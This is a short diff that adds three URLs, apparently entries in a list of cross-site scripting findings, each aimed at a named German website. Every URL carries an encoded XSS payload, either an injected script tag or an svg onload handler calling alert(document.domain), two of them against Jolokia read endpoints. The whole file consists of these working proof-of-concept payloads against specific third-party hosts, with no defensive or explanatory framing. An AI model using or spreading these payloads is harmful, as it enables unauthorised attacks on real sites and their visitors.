@@ -1,0 +1,3 @@
+http://falken4you.de/maxsite/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://faltcaravans.de/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
+https://fakt.tlah-crew.de/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
